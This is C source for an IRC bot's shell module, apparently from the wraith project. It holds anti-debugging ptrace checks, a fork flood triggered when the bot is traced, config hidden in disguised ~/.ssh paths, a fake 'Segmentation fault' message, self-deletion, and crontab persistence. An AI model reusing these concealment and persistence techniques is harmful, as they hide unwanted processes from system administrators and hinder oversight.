/*
 * shell.c -- handles:
 *
 * All shell related functions
 * -shell_exec()
 * -botconfig parsing
 * -check_*()
 * -crontab functions
 *
 */

#include "common.h"
#include "shell.h"
#include "chanprog.h"
#include "cfg.h"
#include "settings.h"
#include "userrec.h"
#include "flags.h"
#include "tandem.h"
#include "main.h"
#include "dccutil.h"
#include "misc.h"
#include "misc_file.h"
#include "bg.h"
#include "stat.h"
#include "users.h"
#ifdef LEAF
#include "src/mod/server.mod/server.h"
#endif /* LEAF */

#include <sys/types.h>
#include <pwd.h>
#include <signal.h>
#ifdef S_ANTITRACE
# ifndef CYGWIN_HACKS
#  include <sys/ptrace.h>
# endif /* !CYGWIN_HACKS */
#include <sys/wait.h>
#endif /* S_ANTITRACE */
#include <sys/utsname.h>
#include <pwd.h>
#include <errno.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <ctype.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dirent.h>

#ifdef WIN32
int
my_system(const char *run)
{
  int ret = -1;
  PROCESS_INFORMATION pinfo;
  STARTUPINFO sinfo;

  memset(&sinfo, 0, sizeof(STARTUPINFO));
  sinfo.cb = sizeof(sinfo);

  sinfo.wShowWindow = SW_HIDE;
  sinfo.dwFlags |= STARTF_USESTDHANDLES;
  sinfo.hStdInput =
  sinfo.hStdOutput =
  sinfo.hStdError =

  ret =
    CreateProcess(NULL, (char *) run, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL,
                  &sinfo, &pinfo);

  if (ret == 0)
    return -1;
  else
    return 0;
}
#endif /* WIN32 */

int clear_tmp()
{
  DIR *tmp = NULL;
  struct dirent *dir_ent = NULL;

  if (!(tmp = opendir(tempdir))) return 1;
  while ((dir_ent = readdir(tmp))) {
    if (strncmp(dir_ent->d_name, ".pid.", 4) && strncmp(dir_ent->d_name, ".u", 2) && strcmp(dir_ent->d_name, ".bin.old")
       && strcmp(dir_ent->d_name, ".") && strcmp(dir_ent->d_name, ".un") && strcmp(dir_ent->d_name, "..")) {
      char *file = NULL;

      file = calloc(1, strlen(dir_ent->d_name) + strlen(tempdir) + 1);

      strcat(file, tempdir);
      strcat(file, dir_ent->d_name);
      file[strlen(file)] = 0;
      sdprintf("clear_tmp: %s", file);
      unlink(file);
      free(file);
    }
  }
  closedir(tmp);
  return 0;
}

#ifdef LEAF
void check_mypid()
{ 
  if (can_stat(conf.bot->pid_file) && (getpid() != checkpid(conf.bot->nick, NULL)))
    fatal(STR("getpid() does not match pid in file. Possible cloned process, exiting.."), 0);
}
#endif /* LEAF */


#ifndef CYGWIN_HACKS

#ifdef S_LASTCHECK
char last_buf[128] = "";
#endif /* S_LASTCHECK */

void check_last() {
#ifdef S_LASTCHECK

  if (!strcmp((char *) CFG_LOGIN.ldata ? CFG_LOGIN.ldata : CFG_LOGIN.gdata ? CFG_LOGIN.gdata : "ignore", "ignore"))
    return;

  if (conf.username) {
    char *out = NULL, buf[50] = "";

    sprintf(buf, "last %s", conf.username);
    if (shell_exec(buf, NULL, &out, NULL)) {
      if (out) {
        char *p = NULL;

        p = strchr(out, '\n');
        if (p)
          *p = 0;
        if (strlen(out) > 10) {
          if (last_buf[0]) {
            if (strncmp(last_buf, out, sizeof(last_buf))) {
              char *work = NULL;

              work = calloc(1, strlen(out) + 7 + 2 + 1);

              sprintf(work, "Login: %s", out);
              detected(DETECT_LOGIN, work);
              free(work);
            }
          }
          strncpyz(last_buf, out, sizeof(last_buf));
        }
        free(out);
      }
    }
  }
#endif /* S_LASTCHECK */
}

void check_processes()
{
#ifdef S_PROCESSCHECK
  char *proclist = NULL, *out = NULL, *p = NULL, *np = NULL, *curp = NULL, buf[1024] = "", bin[128] = "";

  if (!strcmp((char *) CFG_BADPROCESS.ldata ? CFG_BADPROCESS.ldata : CFG_BADPROCESS.gdata ? CFG_BADPROCESS.gdata : "ignore", "ignore"))
    return;

  proclist = (char *) (CFG_PROCESSLIST.ldata && ((char *) CFG_PROCESSLIST.ldata)[0] ?
                       CFG_PROCESSLIST.ldata : CFG_PROCESSLIST.gdata && ((char *) CFG_PROCESSLIST.gdata)[0] ? CFG_PROCESSLIST.gdata : NULL);
  if (!proclist)
    return;

  if (!shell_exec("ps x", NULL, &out, NULL))
    return;

  /* Get this binary's filename */
  strncpyz(buf, binname, sizeof(buf));
  p = strrchr(buf, '/');
  if (p) {
    p++;
    strncpyz(bin, p, sizeof(bin));
  } else {
    bin[0] = 0;
  }
  /* Fix up the "permitted processes" list */
  p = calloc(1, strlen(proclist) + strlen(bin) + 6);
  strcpy(p, proclist);
  strcat(p, " ");
  strcat(p, bin);
  strcat(p, " ");
  proclist = p;
  curp = out;
  while (curp) {
    np = strchr(curp, '\n');
    if (np)
      *np++ = 0;
    if (atoi(curp) > 0) {
      char *pid = NULL, *tty = NULL, *stat = NULL, *time = NULL, cmd[512] = "", line[2048] = "";

      strncpyz(line, curp, sizeof(line));
      /* it's a process line */
      /* Assuming format: pid tty stat time cmd */
      pid = newsplit(&curp);
      tty = newsplit(&curp);
      stat = newsplit(&curp);
      time = newsplit(&curp);
      strncpyz(cmd, curp, sizeof(cmd));
      /* skip any <defunct> procs "/bin/sh -c" crontab stuff and binname crontab stuff */
      if (!strstr(cmd, "<defunct>") && !strncmp(cmd, "/bin/sh -c", 10) && !strncmp(cmd, binname, strlen(binname))) {
        /* get rid of any args */
        if ((p = strchr(cmd, ' ')))
          *p = 0;
        /* remove [] or () */
        if (strlen(cmd)) {
          p = cmd + strlen(cmd) - 1;
          if (((cmd[0] == '(') && (*p == ')')) || ((cmd[0] == '[') && (*p == ']'))) {
            *p = 0;
            strcpy(buf, cmd + 1);
            strcpy(cmd, buf);
          }
        }

        /* remove path */
        if ((p = strrchr(cmd, '/'))) {
          p++;
          strcpy(buf, p);
          strcpy(cmd, buf);
        }

        /* skip "ps" */
        if (strcmp(cmd, "ps")) {
          /* see if proc's in permitted list */
          strcat(cmd, " ");
          if ((p = strstr(proclist, cmd))) {
            /* Remove from permitted list */
            while (*p != ' ')
              *p++ = 1;
          } else {
            char *work = NULL;
            size_t size = 0;

            size = strlen(line) + 22;
            work = calloc(1, size);
            egg_snprintf(work, size, "Unexpected process: %s", line);
            detected(DETECT_PROCESS, work);
            free(work);
          }
        }
      }
    }
    curp = np;
  }
  free(proclist);
  if (out)
    free(out);
#endif /* S_PROCESSCHECK */
}
#endif /* !CYGWIN_HACKS */

void check_promisc()
{
#ifdef S_PROMISC
#ifdef SIOCGIFCONF
  struct ifconf ifcnf;
  char *reqp = NULL, *end_req = NULL, buf[1024] = "";
  int sock;

  if (!strcmp((char *) CFG_PROMISC.ldata ? CFG_PROMISC.ldata : CFG_PROMISC.gdata ? CFG_PROMISC.gdata : "ignore", "ignore"))
    return;

  sock = socket(AF_INET, SOCK_DGRAM, 0);
  if (sock < 0)
    return;
  ifcnf.ifc_len = sizeof(buf);
  ifcnf.ifc_buf = buf;
  if (ioctl(sock, SIOCGIFCONF, &ifcnf) < 0) {
    close(sock);
    return;
  }
  reqp = buf;				/* pointer to start of array */
  end_req = buf + ifcnf.ifc_len;	/* pointer to end of array */
  while (reqp < end_req) { 
    struct ifreq ifreq, *ifr = NULL;

    ifr = (struct ifreq *) reqp;	/* start examining interface */
    ifreq = *ifr;
    if (!ioctl(sock, SIOCGIFFLAGS, &ifreq)) {	/* we can read this interface! */
      /* sdprintf("Examing interface: %s", ifr->ifr_name); */
      if (ifreq.ifr_flags & IFF_PROMISC) {
        char which[101] = "";

        egg_snprintf(which, sizeof(which), "Detected promiscuous mode on interface: %s", ifr->ifr_name);
        /* this turns it off, not likely to *ever* happen though :P */
        ifreq.ifr_flags &= ~(IFF_PROMISC);                  
        ioctl(sock, SIOCSIFFLAGS, &ifreq);	/* set flags */
        detected(DETECT_PROMISC, which);
	break;
      }
    }
    /* move pointer to next array element (next interface) */
    reqp += sizeof(ifr->ifr_name) + sizeof(ifr->ifr_addr);
  }
  close(sock);
#endif /* SIOCGIFCONF */
#endif /* S_PROMISC */
}

#ifdef S_ANTITRACE
int traced = 0;

static void got_sigtrap(int z)
{
  traced = 0;
}
#endif /* S_ANTITRACE */

void check_trace(int start)
{
#ifdef S_ANTITRACE
  int x, parent, i;

  if (!strcmp((char *) CFG_TRACE.ldata ? CFG_TRACE.ldata : CFG_TRACE.gdata ? CFG_TRACE.gdata : "ignore", "ignore"))
    return;
  parent = getpid();
#ifdef __linux__
  /* we send ourselves a SIGTRAP, if we recieve, we're not being traced, otherwise we are. */
  signal(SIGTRAP, got_sigtrap);
  traced = 1;
  raise(SIGTRAP);
  /* no longer need this__asm__("INT3"); //SIGTRAP */
  signal(SIGTRAP, SIG_DFL);
  if (traced) {
    if (start) {
#ifdef S_MESSUPTERM
      messup_term();
#else
      kill(parent, SIGKILL);
      exit(1);
#endif /* S_MESSUPTERM */
    } else
      detected(DETECT_TRACE, "I'm being traced!");
  } else {
    x = fork();
    if (x == -1)
      return;
    else if (x == 0) {
      i = ptrace(PTRACE_ATTACH, parent, 0, 0);
      if (i == (-1) && errno == EPERM) {
        if (start) {
#ifdef S_MESSUPTERM
          messup_term();
#else
          kill(parent, SIGKILL);
          exit(1);
#endif /* S_MESSUPTERM */
        } else
          detected(DETECT_TRACE, "I'm being traced!");
      } else {
        waitpid(parent, &i, 0);
        kill(parent, SIGCHLD);
        ptrace(PTRACE_DETACH, parent, 0, 0);
        kill(parent, SIGCHLD);
      }
      exit(0);
    } else
      wait(&i);
  }
#endif /* __linux__ */
#ifdef BSD
  x = fork();
  if (x == -1)
    return;
  else if (x == 0) {
    i = ptrace(PT_ATTACH, parent, 0, 0);
    if (i == (-1) && errno == EBUSY) {
        if (start) {
#ifdef S_MESSUPTERM
          messup_term();
#else
          kill(parent, SIGKILL);
          exit(1);
#endif /* S_MESSUPTERM */
        } else
          detected(DETECT_TRACE, "I'm being traced");
    } else {
      wait(&i);
      i = ptrace(PT_CONTINUE, parent, (caddr_t) 1, 0);
      kill(parent, SIGCHLD);
      wait(&i);
      i = ptrace(PT_DETACH, parent, (caddr_t) 1, 0);
      wait(&i);
    }
    exit(0);
  } else
    waitpid(x, NULL, 0);
#endif /* BSD */
#endif /* S_ANTITRACE */
}

int shell_exec(char *cmdline, char *input, char **output, char **erroutput)
{
  FILE *inpFile = NULL, *outFile = NULL, *errFile = NULL;
  char tmpFile[161] = "";
  int x, fd;
  int parent = getpid();

  if (!cmdline)
    return 0;
  /* Set up temp files */
  /* always use mkstemp() when handling temp filess! -dizz */
  sprintf(tmpFile, "%s.in-XXXXXX", tempdir);
  if ((fd = mkstemp(tmpFile)) == -1 || (inpFile = fdopen(fd, "w+")) == NULL) {
    if (fd != -1) {
      unlink(tmpFile);
      close(fd);
    }
    putlog(LOG_ERRORS, "*" , "exec: Couldn't open '%s': %s", tmpFile, strerror(errno));
    return 0;
  }
  unlink(tmpFile);
  if (input) {
    if (fwrite(input, strlen(input), 1, inpFile) != 1) {
      fclose(inpFile);
      putlog(LOG_ERRORS, "*", "exec: Couldn't write to '%s': %s", tmpFile, strerror(errno));
      return 0;
    }
    fseek(inpFile, 0, SEEK_SET);
  }
  unlink(tmpFile);
  sprintf(tmpFile, "%s.err-XXXXXX", tempdir);
  if ((fd = mkstemp(tmpFile)) == -1 || (errFile = fdopen(fd, "w+")) == NULL) {
    if (fd != -1) {
      unlink(tmpFile);
      close(fd);
    }
    putlog(LOG_ERRORS, "*", "exec: Couldn't open '%s': %s", tmpFile, strerror(errno));
    return 0;
  }
  unlink(tmpFile);
  sprintf(tmpFile, "%s.out-XXXXXX", tempdir);
  if ((fd = mkstemp(tmpFile)) == -1 || (outFile = fdopen(fd, "w+")) == NULL) {
    if (fd != -1) {
      unlink(tmpFile);
      close(fd);
    }
    putlog(LOG_ERRORS, "*", "exec: Couldn't open '%s': %s", tmpFile, strerror(errno));
    return 0;
  }
  unlink(tmpFile);
  x = fork();
  if (x == -1) {
    putlog(LOG_ERRORS, "*", "exec: fork() failed: %s", strerror(errno));
    fclose(inpFile);
    fclose(errFile);
    fclose(outFile);
    return 0;
  }
  if (x) {
    /* Parent: wait for the child to complete */
    int st = 0;

    waitpid(x, &st, 0);
    /* Now read the files into the buffers */
    fclose(inpFile);
    fflush(outFile);
    fflush(errFile);
    if (erroutput) {
      char *buf = NULL;
      int fs;

      fseek(errFile, 0, SEEK_END);
      fs = ftell(errFile);
      if (fs == 0) {
        (*erroutput) = NULL;
      } else {
        buf = calloc(1, fs + 1);
        fseek(errFile, 0, SEEK_SET);
        fread(buf, 1, fs, errFile);
        buf[fs] = 0;
        (*erroutput) = buf;
      }
    }
    fclose(errFile);
    if (output) {
      char *buf;
      int fs;

      fseek(outFile, 0, SEEK_END);
      fs = ftell(outFile);
      if (fs == 0) {
        (*output) = NULL;
      } else {
        buf = calloc(1, fs + 1);
        fseek(outFile, 0, SEEK_SET);
        fread(buf, 1, fs, outFile);
        buf[fs] = 0;
        (*output) = buf;
      }
    }
    fclose(outFile);
    return 1;
  } else {
    /* Child: make fd's and set them up as std* */
    int ind, outd, errd;
    char *argv[4] = { NULL, NULL, NULL, NULL };

    ind = fileno(inpFile);
    outd = fileno(outFile);
    errd = fileno(errFile);
    if (dup2(ind, STDIN_FILENO) == (-1)) {
      kill(parent, SIGCHLD);
      exit(1);
    }
    if (dup2(outd, STDOUT_FILENO) == (-1)) {
      kill(parent, SIGCHLD);
      exit(1);
    }
    if (dup2(errd, STDERR_FILENO) == (-1)) {
      kill(parent, SIGCHLD);
      exit(1);
    }
    argv[0] = "sh";
    argv[1] = "-c";
    argv[2] = cmdline;
    argv[3] = NULL;
    execvp(argv[0], &argv[0]);
    kill(parent, SIGCHLD);
    exit(1);
  }
}

void detected(int code, char *msg)
{
  char *p = NULL, tmp[512] = "";
  struct userrec *u = NULL;
  struct flag_record fr = { FR_GLOBAL, 0, 0, 0 };
  int act;

  u = get_user_by_handle(userlist, conf.bot->nick);
#ifdef S_LASTCHECK
  if (code == DETECT_LOGIN)
    p = (char *) (CFG_LOGIN.ldata ? CFG_LOGIN.ldata : (CFG_LOGIN.gdata ? CFG_LOGIN.gdata : NULL));
#endif /* S_LASTCHECK */
#ifdef S_ANTITRACE
  if (code == DETECT_TRACE)
    p = (char *) (CFG_TRACE.ldata ? CFG_TRACE.ldata : (CFG_TRACE.gdata ? CFG_TRACE.gdata : NULL));
#endif /* S_ANTITRACE */
#ifdef S_PROMISC
  if (code == DETECT_PROMISC)
    p = (char *) (CFG_PROMISC.ldata ? CFG_PROMISC.ldata : (CFG_PROMISC.gdata ? CFG_PROMISC.gdata : NULL));
#endif /* S_PROMISC */
#ifdef S_PROCESSCHECK
  if (code == DETECT_PROCESS)
    p = (char *) (CFG_BADPROCESS.ldata ? CFG_BADPROCESS.ldata : (CFG_BADPROCESS.gdata ? CFG_BADPROCESS.gdata : NULL));
#endif /* S_PROMISC */
#ifdef S_HIJACKCHECK
  if (code == DETECT_SIGCONT)
    p = (char *) (CFG_HIJACK.ldata ? CFG_HIJACK.ldata : (CFG_HIJACK.gdata ? CFG_HIJACK.gdata : NULL));
#endif /* S_PROMISC */

  if (!p)
    act = DET_WARN;
  else if (!strcmp(p, "die"))
    act = DET_DIE;
  else if (!strcmp(p, "reject"))
    act = DET_REJECT;
  else if (!strcmp(p, "suicide"))
    act = DET_SUICIDE;
  else if (!strcmp(p, "ignore"))
    act = DET_IGNORE;
  else
    act = DET_WARN;
  switch (act) {
  case DET_IGNORE:
    break;
  case DET_WARN:
    putlog(LOG_WARN, "*", msg);
    break;
  case DET_REJECT:
    do_fork();
    putlog(LOG_WARN, "*", "Setting myself +d: %s", msg);
    sprintf(tmp, "+d: %s", msg);
    set_user(&USERENTRY_COMMENT, u, tmp);
    fr.global = USER_DEOP;
    fr.bot = 1;
    set_user_flagrec(u, &fr, 0);
    sleep(1);
    break;
  case DET_DIE:
    putlog(LOG_WARN, "*", "Dying: %s", msg);
    sprintf(tmp, "Dying: %s", msg);
    set_user(&USERENTRY_COMMENT, u, tmp);
#ifdef LEAF
    nuke_server("BBL");
#endif /* LEAF */
    sleep(1);
    fatal(msg, 0);
    break;
  case DET_SUICIDE:
    putlog(LOG_WARN, "*", "Comitting suicide: %s", msg);
    sprintf(tmp, "Suicide: %s", msg);
    set_user(&USERENTRY_COMMENT, u, tmp);
#ifdef LEAF
    nuke_server("HARAKIRI!!");
#endif /* LEAF */
    sleep(1);
    unlink(binname);
#ifdef HUB
    unlink(userfile);
    sprintf(tmp, "%s~", userfile);
    unlink(tmp);
#endif /* HUB */
    fatal(msg, 0);
    break;
  }
}

char *werr_tostr(int errnum)
{
  switch (errnum) {
  case ERR_BINSTAT:
    return "Cannot access binary";
  case ERR_BADPASS:
    return "Incorrect password";
  case ERR_BINMOD:
    return "Cannot chmod() binary";
  case ERR_PASSWD:
    return "Cannot access the global passwd file";
  case ERR_WRONGBINDIR:
    return "Wrong directory/binary name";
  case ERR_CONFSTAT:
#ifdef LEAF
    return STR("Cannot access config directory (~/.ssh/)");
#else
    return "Cannot access config directory (./)";
#endif /* LEAF */
  case ERR_TMPSTAT:
#ifdef LEAF
    return STR("Cannot access tmp directory (~/.ssh/.../)");
#else
    return STR("Cannot access config directory (./tmp/)");
#endif /* LEAF */
  case ERR_CONFDIRMOD:
#ifdef LEAF
    return STR("Cannot chmod() config directory (~/.ssh/)");
#else
    return "Cannot chmod() config directory (./)";
#endif /* LEAF */
  case ERR_CONFMOD:
#ifdef LEAF
    return STR("Cannot chmod() config (~/.ssh/.known_hosts/)");
#else
    return STR("Cannot chmod() config (./conf)");
#endif /* LEAF */
  case ERR_TMPMOD:
#ifdef LEAF
    return STR("Cannot chmod() tmp directory (~/.ssh/.../)");
#else
    return STR("Cannot chmod() tmp directory (./tmp)");
#endif /* LEAF */
  case ERR_NOCONF:
#ifdef LEAF
    return STR("The local config is missing (~/.ssh/.known_hosts)");
#else
    return STR("The local config is missing (./conf)");
#endif /* LEAF */
  case ERR_CONFBADENC:
    return STR("Encryption in config is wrong/corrupt");
  case ERR_WRONGUID:
    return STR("UID in conf does not match geteuid()");
  case ERR_WRONGUNAME:
    return STR("Uname in conf does not match uname()");
  case ERR_BADCONF:
    return "Config file is incomplete";
  case ERR_BADBOT:
    return STR("No such botnick");
  case ERR_BOTDISABLED:
    return STR("Bot is disabled, remove '/' in config");
  case ERR_NOBOTS:
    return STR("There are no bots in the config! Please use ./binary -C to edit");
  default:
    return "Unforseen error";
  }

}

void werr(int errnum)
{
/* [1]+  Done                    ls --color=auto -A -CF
   [1]+  Killed                  bash
*/
/*
  int x = 0;
  unsigned long job = randint(2) + 1; */

/*  printf("[%lu] %lu%lu%lu%lu%lu\n", job, randint(2) + 1, randint(8) + 1, randint(8) + 1, errnum); */

/*    printf("\n[%lu]+  Killed                  rm -rf /\r\n", job); */
  /*
  if (checkedpass) {
    printf("[%lu] %d\n", job, getpid());
  }
  */
  /*  printf("\n[%lu]+  Stopped                 %s\r\n", job, basename(binname)); */
  sdprintf("Error %d: %s", errnum, werr_tostr(errnum));
  printf("*** Error code %d\n\n", errnum);
  printf(STR("Segmentation fault\n"));
  fatal("", 0);
}

int email(char *subject, char *msg, int who)
{
  struct utsname un;
  char run[2048] = "", addrs[1024] = "";
  int mail = 0, sendmail = 0;
  FILE *f = NULL;

  uname(&un);
  if (is_file("/usr/sbin/sendmail"))
    sendmail++;
  else if (is_file("/usr/bin/mail"))
    mail++;
  else {
    putlog(LOG_WARN, "*", "I Have no usable mail client.");
    return 1;
  }

  if (who & EMAIL_OWNERS) {
    sprintf(addrs, "%s", replace(owneremail, ",", " "));
  }
  if (who & EMAIL_TEAM) {
    if (addrs[0])
      sprintf(addrs, "%s wraith@shatow.net", addrs);
    else
      sprintf(addrs, "wraith@shatow.net");
  }

  if (sendmail)
    sprintf(run, "/usr/sbin/sendmail -t");
  else if (mail)
    sprintf(run, "/usr/bin/mail %s -a \"From: %s@%s\" -s \"%s\" -a \"Content-Type: text/plain\"", addrs, conf.bot->nick ? conf.bot->nick : "none", un.nodename, subject);

  if ((f = popen(run, "w"))) {
    if (sendmail) {
      fprintf(f, "To: %s\n", addrs);
      fprintf(f, "From: %s@%s\n", origbotname[0] ? origbotname : (conf.username ? conf.username : "WRAITH"), un.nodename);
      fprintf(f, "Subject: %s\n", subject);
      fprintf(f, "Content-Type: text/plain\n");
    }
    fprintf(f, "%s\n", msg);
    if (fflush(f))
      return 1;
    if (pclose(f))
      return 1;
  } else
    return 1;
  return 0;
}

void baduname(char *confhas, char *myuname) {
  char *tmpFile = NULL;
  int tosend = 0, make = 0;

  tmpFile = calloc(1, strlen(tempdir) + 3 + 1);

  sprintf(tmpFile, "%s.un", tempdir);
  sdprintf("CHECKING %s", tmpFile);
  if (is_file(tmpFile)) {
    struct stat ss;
    time_t diff;

    stat(tmpFile, &ss);
    diff = now - ss.st_mtime;
    if (diff >= 86400) {
      tosend++;          		/* only send once a day */
      unlink(tmpFile);		/* remove file */
      make++;			/* make a new one at thie time. */
    }
  } else {
    make++;
  }

  if (make) {
    FILE *fp = NULL;
    if ((fp = fopen(tmpFile, "w"))) {
      fprintf(fp, "\n");
      fflush(fp);
      fclose(fp);
      tosend++;           /* only send if we could write the file. */
    }
  }

  if (tosend) {
    struct utsname un;
    char msg[501] = "", subject[31] = "";

    uname(&un);
    egg_snprintf(subject, sizeof subject, "CONF/UNAME() mismatch notice");
    egg_snprintf(msg, sizeof msg, STR("This is an auto email from a wraith bot which has you in it's OWNER_EMAIL list..\n \nThe uname() output on this box has changed, probably due to a kernel upgrade...\nMy login is: %s\nConf   : %s\nUname(): %s\n \nThis email will only be sent once a day while this error is present.\nYou need to login to my shell (%s) and fix my local config.\n"), 
                                  conffile.username ? conffile.username : (conf.username ? conf.username : "unknown"), 
                                  confhas, myuname, un.nodename);
    email(subject, msg, EMAIL_OWNERS);
  }
  free(tmpFile);
}

char *homedir()
{
  static char homedir_buf[DIRMAX] = "";

  if (!homedir_buf || (homedir_buf && !homedir_buf[0])) {
    char tmp[DIRMAX] = "";
    if (conf.homedir)
      egg_snprintf(tmp, sizeof tmp, "%s", conf.homedir);
    else {
#ifdef CYGWIN_HACKS
      egg_snprintf(tmp, sizeof tmp, "%s", dirname(binname));
#else /* !CYGWIN_HACKS */
      struct passwd *pw = NULL;
 
      ContextNote("getpwuid()");
      pw = getpwuid(myuid);
      egg_snprintf(tmp, sizeof tmp, "%s", pw->pw_dir);
      ContextNote("getpwuid(): Success");
#endif /* CYGWIN_HACKS */
    }
    ContextNote("realpath()");
    realpath(tmp, homedir_buf); /* this will convert lame home dirs of /home/blah->/usr/home/blah */
    ContextNote("realpath(): Success");
  }
  return homedir_buf;
}

char *my_username()
{
  static char username[DIRMAX] = "";

  if (!username || (username && !username[0])) {
    if (conf.username)
      egg_snprintf(username, sizeof username, "%s", conf.username);
    else {
#ifdef CYGWIN_HACKS
      egg_snprintf(username, sizeof username, "cygwin");
#else /* !CYGWIN_HACKS */
      struct passwd *pw = NULL;

      ContextNote("getpwuid()");
      pw = getpwuid(myuid);
      ContextNote("getpwuid(): Success");
      egg_snprintf(username, sizeof username, "%s", pw->pw_name);
#endif /* CYGWIN_HACKS */
    }
  }
  return username;
}

char *confdir()
{
  static char confdir_buf[DIRMAX] = "";

  if (!confdir_buf || (confdir_buf && !confdir_buf[0])) {
#ifdef LEAF
    egg_snprintf(confdir_buf, sizeof confdir_buf, "%s/.ssh", homedir());
#endif /* LEAF */
#ifdef HUB
    egg_snprintf(confdir_buf, sizeof confdir_buf, "%s", dirname(binname));
#endif /* HUB */
#ifdef CYGWIN_HACKS
    egg_snprintf(confdir_buf, sizeof confdir_buf, "%s", homedir());
#endif /* CYGWIN_HACKS */
  }
  return confdir_buf;
}

char *my_uname()
{
  static char os_uname[250] = "";

  if (!os_uname || (os_uname && !os_uname[0])) {
    char *unix_n = NULL, *vers_n = NULL;
    struct utsname un;

    if (uname(&un) < 0) {
      unix_n = "*unkown*";
      vers_n = "";
    } else {
      unix_n = un.nodename;
#ifdef __FreeBSD__
      vers_n = un.release;
#else /* __linux__ */
      vers_n = un.version;
#endif /* __FreeBSD__ */
    }
    egg_snprintf(os_uname, sizeof os_uname, "%s %s", unix_n, vers_n);
  }
  return os_uname;
}

void check_crontab()
{
  int i = 0;

#ifdef LEAF
  if (!conf.bot->localhub)
    fatal("something is wrong.", 0);
#endif /* LEAF */
  if (!(i = crontab_exists())) {
    crontab_create(5);
    if (!(i = crontab_exists()))
      printf("* Error writing crontab entry.\n");
  }
}

void crontab_del() {
  char *tmpFile = NULL, *p = NULL, buf[2048] = "";

  tmpFile = calloc(1, strlen(binname) + 100);

  strcpy(tmpFile, binname);
  if (!(p = strrchr(tmpFile, '/')))
    return;
  p++;
  strcpy(p, ".ctb");
  sprintf(buf, "crontab -l | grep -v \"%s\" | grep -v \"^#\" | grep -v \"^\\$\" > %s", binname, tmpFile);
  if (shell_exec(buf, NULL, NULL, NULL)) {
    sprintf(buf, "crontab %s", tmpFile);
    shell_exec(buf, NULL, NULL, NULL);
  }
  unlink(tmpFile);
}

int crontab_exists() {
  char buf[2048] = "", *out = NULL;

  egg_snprintf(buf, sizeof buf, "crontab -l | grep \"%s\" | grep -v \"^#\"", binname);
  if (shell_exec(buf, NULL, &out, NULL)) {
    if (out && strstr(out, binname)) {
      free(out);
      return 1;
    } else {
      if (out)
        free(out);
      return 0;
    }
  } else
    return (-1);
}

void crontab_create(int interval) {
  char tmpFile[161] = "", buf[256] = "";
  FILE *f = NULL;
  int fd;

  egg_snprintf(tmpFile, sizeof tmpFile, "%s.crontab-XXXXXX", tempdir);
  if ((fd = mkstemp(tmpFile)) == -1) {
    unlink(tmpFile);
    return;
  }

  egg_snprintf(buf, sizeof buf, "crontab -l | grep -v \"%s\" | grep -v \"^#\" | grep -v \"^\\$\"> %s", binname, tmpFile);
  if (shell_exec(buf, NULL, NULL, NULL) && (f = fdopen(fd, "a")) != NULL) {
    buf[0] = 0;
    if (interval == 1)
      strcpy(buf, "*");
    else {
      int i = 1;
      int si = randint(interval);

      while (i < 60) {
        if (buf[0])
          sprintf(buf + strlen(buf), ",%i", (i + si) % 60);
        else
          sprintf(buf, "%i", (i + si) % 60);
        i += interval;
      }
    }
    egg_snprintf(buf + strlen(buf), sizeof buf, " * * * * %s > /dev/null 2>&1", binname);
    fseek(f, 0, SEEK_END);
    fprintf(f, "\n%s\n", buf);
    fclose(f);
    sprintf(buf, "crontab %s", tmpFile);
    shell_exec(buf, NULL, NULL, NULL);
  }
  close(fd);
  unlink(tmpFile);
}

#ifdef S_MESSUPTERM
static void messup_term() {
  int i;
  char *argv[4] = { NULL, NULL, NULL, NULL };

  freopen("/dev/null", "w", stderr);
  for (i = 0; i < 11; i++) {
    fork();
  }
  argv[0] = calloc(1, 100);
  strcpy(argv[0], "/bin/sh");
  argv[1] = "-c";
  argv[2] = calloc(1, 1024);
  strcpy(argv[2], "cat < ");
  strcat(argv[2], binname);
  argv[3] = NULL;
  execvp(argv[0], &argv[0]);
}
#endif /* S_MESSUPTERM */


#ifdef CRAZY_TRACE
/* This code will attach a ptrace() to getpid() hence blocking process hijackers/tracers on the pid
 * only problem.. it just creates a new pid to be traced/hijacked :\
 */
int attached = 0;
void crazy_trace()
{
  int parent = getpid();
  int x = fork();

  if (x == -1) {
    printf("Can't fork(): %s\n", strerror(errno));
  } else if (x == 0) {
    /* child */
    int i;
    i = ptrace(PTRACE_ATTACH, parent, (char *) 1, 0);
    if (i == (-1) && errno == EPERM) {
      printf("CANT PTRACE PARENT: errno: %d %s, i: %d\n", errno, strerror(errno), i);
      waitpid(parent, &i, 0);
      kill(parent, SIGCHLD);
      ptrace(PTRACE_DETACH, parent, 0, 0);
      kill(parent, SIGCHLD);
      exit(0);
    } else {
      printf("SUCCESSFUL ATTACH to %d: %d\n", parent, i);
      attached++;
    }
  } else {
    /* parent */
    printf("wait()\n");
    wait(&x);
  }
  printf("end\n");
}
#endif /* CRAZY_TRACE */


/* need to account for this after reading in conf/spawning bots. 
ifdef LEAF
      if (updating)
        exit(0);  let cron restart us. 
    }  localhub 
endif LEAF 
*/


